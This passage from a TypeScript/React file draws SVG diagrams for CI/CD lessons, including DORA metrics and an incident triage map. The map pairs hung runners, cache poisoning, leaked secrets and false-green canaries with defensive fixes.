        <Pill x={334} y={100} w={236} h={48} label="Edit: packages/ui/Button.tsx" sub="turbo run test --filter=...[origin/main]" tone="violet" p={p} />
        <Pill x={334} y={162} w={112} h={56} label="apps/web" sub="AFFECTED -> Run!" tone="amber" p={p} />
        <Pill x={458} y={162} w={112} h={56} label="apps/admin" sub="AFFECTED -> Run!" tone="amber" p={p} />
        <Pill x={334} y={232} w={236} h={52} label="services/payment-api (Unrelated)" sub="SKIPPED + Remote Cache Hit (0.2s)!" tone="emerald" p={p} />
        <text x="452" y="314" textAnchor="middle" fill={p.tones.violet.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Requires checkout fetch-depth: 0!
        </text>

        <BoxCard x="604" y="58" w="252" h="300" tone="emerald" p={p} title="4 DORA ELITE METRICS" badge="Speed + Stability" />
        <CalloutBadge x={624} y={58} num={3} tone="emerald" p={p} />
        <Pill x={620} y={100} w={220} h={46} label="1. Deployment Frequency" sub="Elite: On-demand (Multi/day)" tone="sky" p={p} />
        <Pill x={620} y={156} w={220} h={46} label="2. Lead Time for Changes" sub="Elite: Commit -> Prod < 1 hour" tone="cyan" p={p} />
        <Pill x={620} y={212} w={220} h={46} label="3. Change Failure Rate (CFR)" sub="Elite: < 5% (Guarded by CI/Canary)" tone="emerald" p={p} />
        <Pill x={620} y={268} w={220} h={46} label="4. Time to Restore (MTTR)" sub="Elite: < 1h (Auto-Rollback/Revert)" tone="amber" p={p} />
        <text x="730" y="336" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9">
          Speed &amp; Stability reinforce each other
        </text>

        <path d="M 162 152 L 162 162" fill="none" stroke={p.tones.sky.stroke} strokeWidth="1.8" markerEnd={marker('sky')} />
        <path d="M 162 216 L 162 226" fill="none" stroke={p.tones.violet.stroke} strokeWidth="1.8" markerEnd={marker('violet')} />
        <path d="M 410 148 L 390 160" fill="none" stroke={p.tones.amber.stroke} strokeWidth="1.8" markerEnd={marker('amber')} />
        <path d="M 494 148 L 514 160" fill="none" stroke={p.tones.amber.stroke} strokeWidth="1.8" markerEnd={marker('amber')} />
      </>
    )}
  </SvgShell>
);

// C17: CI/CD Incident War-Room Triage Map (Leaked Secret Rotation, Broken Cache Poisoning, Hung Runner, Failed Canary Rollback)
const C17Diagram: DiagramRenderer = ({ isLight, className }) => (
  <SvgShell id="c17" isLight={isLight} className={className} title="CI/CD Incident War-Room Triage Map: 4 Production Emergency Playbooks" tag="cicd:c17">
    {(p, marker) => (
      <>
        <BoxCard x="24" y="58" w="404" h="142" tone="amber" p={p} title="CASE B1: 42m BOTTLENECK & 360m HUNG RUNNER" badge="Critical Path" />
        <CalloutBadge x={44} y={58} num={1} tone="amber" p={p} />
        <Pill x={40} y={98} w={182} h={44} label="Symptom: 42m PR + 6h Hang" sub="Serial + sleep 45 + no timeout" tone="rose" p={p} />
        <Pill x={232} y={98} w={180} h={44} label="Fix: DAG + 4x Sharding" sub="timeout-minutes: 15 -> <5m!" tone="emerald" p={p} />
        <text x="226" y="168" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9.5">
          npm ci + setup-node cache + poll /healthz loop
        </text>
        <path d="M 222 120 L 230 120" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />

        <BoxCard x="452" y="58" w="404" h="142" tone="rose" p={p} title="CASE B2: DEPLOY RACE & CACHE POISONING" badge="State Safety" />
        <CalloutBadge x={472} y={58} num={2} tone="rose" p={p} />
        <Pill x={468} y={98} w={182} h={44} label="Symptom: Torn Prod State" sub="cancel-in-progress: true on Prod!" tone="rose" p={p} />
        <Pill x={660} y={98} w={180} h={44} label="Fix: cancel: false Queue" sub="PRs read-only cache + lock hash" tone="emerald" p={p} />
        <text x="654" y="168" textAnchor="middle" fill={p.inkMuted} fontFamily={MONO} fontSize="9.5">
          Queues Prod runs safely; purges poisoned cache keys
        </text>
        <path d="M 650 120 L 658 120" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />

        <BoxCard x="24" y="216" w="404" h="142" tone="rose" p={p} title="CASE B3: LEAKED SECRET IN GIT HISTORY" badge="Revoke First!" />
        <CalloutBadge x={44} y={216} num={3} tone="rose" p={p} />
        <Pill x={40} y={256} w={182} h={44} label="1. Revoke & Rotate Key NOW" sub="Deleting line != erasing git log!" tone="rose" p={p} />
        <Pill x={232} y={256} w={180} h={44} label="2. Gitleaks + Keyless OIDC" sub="fetch-depth: 0 blocks future leaks" tone="emerald" p={p} />
        <text x="226" y="326" textAnchor="middle" fill={p.tones.rose.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Never rely on a follow-up commit to hide a leaked key!
        </text>
        <path d="M 222 278 L 230 278" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />

        <BoxCard x="452" y="216" w="404" h="142" tone="violet" p={p} title="CASE B6: FALSE-GREEN & FAILED CANARY" badge="Zero Silent 500s" />
        <Pill x={468} y={256} w={182} h={44} label="Ban || true & continue-err" sub="Use curl --fail Smoke Gate" tone="violet" p={p} />
        <Pill x={660} y={256} w={180} h={44} label="Auto-Rollback to SHA Tag" sub="Canary abort / git revert <30s" tone="emerald" p={p} />
        <text x="654" y="326" textAnchor="middle" fill={p.tones.emerald.fg} fontFamily={MONO} fontSize="9.5" fontWeight="700">
          Every non-zero exit code MUST halt delivery!
        </text>
        <path d="M 650 278 L 658 278" fill="none" stroke={p.tones.emerald.stroke} strokeWidth="1.8" markerEnd={marker('emerald')} />
      </>
    )}
  </SvgShell>
);

export const CICD_DIAGRAMS: Record<string, DiagramRenderer> = {
  'cicd:c00': C00Diagram,
  'cicd:c01': C01Diagram,
  'cicd:c02': C02Diagram,
  'cicd:c03': C03Diagram,
  'cicd:c04': C04Diagram,
  'cicd:c05': C05Diagram,
  'cicd:c06': C06Diagram,
  'cicd:c07': C07Diagram,
  'cicd:c08': C08Diagram,
  'cicd:c09': C09Diagram,
  'cicd:c10': C10Diagram,
  'cicd:c11': C11Diagram,
  'cicd:c12': C12Diagram,
  'cicd:c13': C13Diagram,
  'cicd:c14': C14Diagram,
  'cicd:c15': C15Diagram,
  'cicd:c16': C16Diagram,
  'cicd:c17': C17Diagram,
};
